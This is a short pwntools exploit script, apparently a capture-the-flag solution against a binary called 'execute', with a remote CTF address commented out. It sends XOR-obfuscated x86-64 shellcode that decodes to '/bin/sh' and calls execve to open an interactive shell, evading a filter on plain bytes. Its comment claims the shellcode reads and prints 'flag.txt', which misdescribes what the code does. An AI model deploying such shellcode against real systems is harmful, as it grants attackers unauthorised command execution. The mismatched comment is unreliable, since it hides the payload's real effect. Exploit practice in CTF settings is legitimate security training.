from pwn import *
import time

# Load Environment
context(arch='amd64', os='linux')
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./execute")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./execute")
#p = remote("94.237.54.218", 34642)
p = gdb.debug("./execute", '''
break *main
break *main+174
break *check+116''')

file_name = 'flag.txt'
length = 32


# Generate shellcode to open the file 'flag.txt', read it, and output the contents to stdout
shellcode = '''
mov rax, 0x2a2a2a2a2a2a2a2a
push rax

mov rax, 0x2a42590544434805
xor [rsp], rax
mov rdi, rsp

push 0x0
pop rsi
push 0x0
pop rdx

push 0x3a
pop rax
add al, 0x1
syscall
'''
#shellcode += shellcraft.read('rax', 'rsp', length)
#shellcode += shellcraft.write(1, 'rsp', length)

print(shellcode)
print(hexdump(asm(shellcode)))

sc = asm(shellcode)


exploit  = b""
exploit += sc


print(p.recv())
p.sendline(exploit)
p.interactive()
